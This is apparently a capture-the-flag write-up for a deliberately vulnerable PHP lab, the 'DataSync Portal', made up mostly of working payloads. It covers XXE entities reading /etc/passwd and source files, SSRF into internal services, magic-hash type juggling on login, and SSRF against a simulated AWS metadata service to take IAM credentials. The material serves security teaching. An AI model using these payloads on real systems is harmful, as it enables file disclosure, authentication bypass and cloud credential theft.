# Writeup – DataSync Portal
---

## Flag 1 – XXE (XML External Entity Injection)

**Endpoint:** `http://localhost:8000/xml-import.php`

**Idea:** The page parses XML submitted by the user. The XML parser is
configured with `LIBXML_NOENT | LIBXML_DTDLOAD`, which allows loading
external entities. An attacker can define an entity in the DTD that points
to a local file — the file content is then shown in the page output.

### Step 1 – Confirm external entity support

Submit the following XML payload to check if the parser resolves external
entities:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<records>
  <record><name>check</name><value>&xxe;</value></record>
</records>
```

**Expected result:** The content of `/etc/passwd` shows up in the value
column. The user `php` with uid 1000 is visible — this confirms that the
parser reads server-side files and prints their content.

### Step 2 – Read the flag

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY flag SYSTEM "file:///etc/flag.txt">
]>
<records>
  <record><name>flag</name><value>&flag;</value></record>
</records>
```

**Result:** **Flag 1** shows up in the value column: `FLAG_PLACEHOLDER_xxe`

### Bonus – Read source code (preparation for Flag 3)

XXE also allows reading PHP source files. This is the starting point for the
full exploit chain: reading `login.php` reveals the stored hash and the
insecure `==` comparison:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY src SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/login.php">]>
<records>
  <record><name>src</name><value>&src;</value></record>
</records>
```
-> This lets you read the PHP file's content as a Base64 string, since the
PHP file itself can't be output directly. You can then decode the string in
a terminal.

```bash
echo "YOUR_BASE64_STRING_HERE" | base64 -d
```

**Result:** The source code of `login.php` shows up. It contains:
- `define('ADMIN_TOKEN_HASH', '0e462097431906509019562988736854')`
- A comparison using `==` instead of `===`

That's all the information needed for Flag 3.

### Bonus – XXE as an SSRF vector
While reading `login.php` via XXE, you find a hint about what
`http://secret-service/` contains. This internal service can also be
reached directly through XXE. This is also the entry point for Flag 2.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY ssrf SYSTEM "http://secret-service/">
]>
<records>
  <record><name>result</name><value>&ssrf;</value></record>
</records>
```

**Result:** `FLAG_PLACEHOLDER_ssrf` — the same flag as Flag 2, but reached
through a different attack path (XXE instead of SSRF via
`url-preview.php`).

---

## Flag 2 – SSRF (Server-Side Request Forgery)

**Endpoint:** `http://localhost:8000/url-preview.php`

**Idea:** The page fetches a URL chosen by the user via `curl_exec()` and
shows the response body. There is no check on whether the URL points to an
internal host. The `secret-service` container runs in the same Docker
network but has no port mapped to the outside — so it can't be reached
directly from the browser. Through `url-preview.php`, an attacker can use
the web server as a proxy.

### Step 1 – Confirm the fetch function

Enter the URL `https://example.com` -> The HTML content of example.com
shows up. Confirmed: the page fetches arbitrary URLs.

### Step 2 – Reach the internal service

Enter the URL:
```
http://secret-service/
```
-> The URL can be found in Flag 1 or Flag 3.

**Result:** **Flag 2** shows up in the preview: `FLAG_PLACEHOLDER_ssrf`

---

## Flag 3 – PHP Type Juggling (Magic Hash)

**Endpoint:** `http://localhost:8000/login.php`

**Idea:** The login system stores an MD5 hash of the admin token and
compares it on login using `==` (loose comparison instead of `===`). In
PHP, strings matching the pattern `0e[0-9]+` are interpreted as scientific
notation and converted to the float `0.0`. Two such strings are therefore
equal under `==` — no matter how different they actually are. Values like
this are called "magic hashes" and are publicly documented.

The stored hash is: `0e462097431906509019562988736854`
(= `md5("240610708")`)

### Step 1 – Observe the behavior

Enter any string (e.g. `test`) and submit it.

**Result:** An error message shows the submitted hash, e.g.
`submitted hash: 098f6bcd4621d373cade4e832627b4f6`

This confirms: the system calculates `md5(input)` and compares the result.

### Step 2 – Identify a magic hash

The stored hash `0e462097431906509019562988736854` starts with `0e`
followed by only digits. (You know this because you already read the
source code of `login.php` via XXE.) PHP interprets this as
`0 × 10^462... = 0.0`.

We need an input whose MD5 hash also starts with `0e` and contains only
digits. Such values are publicly known:

Token: `240610708`
MD5 hash: `0e462097431906509019562988736854`

### Step 3 – Log in

Enter the token `240610708` and submit it.

PHP calculates: `md5("240610708") = 0e462097431906509019562988736854`

Comparison: `'0e462097431906509019562988736854' == '0e462097431906509019562988736854'` -> `true`

**Result:** **Flag 3** shows up: `FLAG_PLACEHOLDER_type_juggling`

After logging in, a hint also appears:
*"An internal microservice is running at `http://secret-service/` — not reachable from outside."*

---

## Flag 4 – SSRF on a simulated cloud metadata service

**Endpoint:** `http://localhost:8000/url-preview.php`

**Idea:** In real cloud environments (AWS EC2), a metadata service is
reachable at `http://169.254.169.254/` and contains temporary IAM
credentials. An attacker who can exploit SSRF gets access to these
credentials and can potentially gain full access to the cloud account
(real-world example: the Capital One breach in 2019).

In this challenge, the `metadata` container simulates this service under
the hostname `metadata.internal`. You can find a hint pointing to it:
- in the HTML comment on the home page (right-click -> view page source)

### Step 1 – Explore the endpoint

```
http://metadata.internal/
```
-> Returns: `1.0 / 2007-01-19 / latest` — identical to the real AWS IMDS.

### Step 2 – Navigate the paths

```
http://metadata.internal/latest/meta-data/
```
-> Lists available fields, including `iam/`.

```
http://metadata.internal/latest/meta-data/iam/security-credentials/
```
-> Returns the role name `datasync-role`.

### Step 3 – Fetch the credentials

```
http://metadata.internal/latest/meta-data/iam/security-credentials/datasync-role
```

-> Returns JSON:
```json
{
  "Code": "Success",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAXXXXXXXXXXXXXXXQ",
  "SecretAccessKey": "FLAG_PLACEHOLDER_metadata",
  ...
}
```

**Result:** **Flag 4** is in the `SecretAccessKey` field:
`FLAG_PLACEHOLDER_metadata`

---
